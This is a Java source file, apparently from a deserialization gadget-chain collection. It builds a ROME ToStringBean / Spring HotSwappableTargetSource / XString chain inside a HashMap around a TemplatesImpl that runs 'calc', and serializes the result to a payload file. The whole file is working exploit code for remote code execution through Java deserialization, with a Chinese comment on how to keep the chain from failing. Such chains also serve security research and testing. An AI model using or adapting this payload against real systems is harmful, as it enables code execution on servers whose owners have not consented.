package Seri.RomeGadgets;

import Seri.Utils;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xpath.internal.objects.XString;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ToStringBean;
import org.springframework.aop.target.HotSwappableTargetSource;

import javax.xml.transform.Templates;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;

import static Seri.Utils.*;

public class HSTSRome {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = Utils.createTemplatesImpl("calc");

        /**
         * 必须要用 Templates.class
         * 否则会触发 ToStringBean#toString(String prefix) 中的 Exception 直接导致反序列化失败
         */
        ToStringBean toStringBean = new ToStringBean(Templates.class,templates);

        XString xString = new XString("aaa");

        HotSwappableTargetSource h1 = new HotSwappableTargetSource(toStringBean);
        HotSwappableTargetSource h2 = new HotSwappableTargetSource(xString);

        HashMap<Object,Object> hashMap = new HashMap<>();
        hashMap.put(h1,"x");
        hashMap.put(h2,"x");

        serialize(hashMap ,"bin/HSTSRome.bin");
//        HashMap hashMap1 = (HashMap) unserialize("bin/HSTSRome.bin");
//        System.out.println(hashMap1);

    }
}
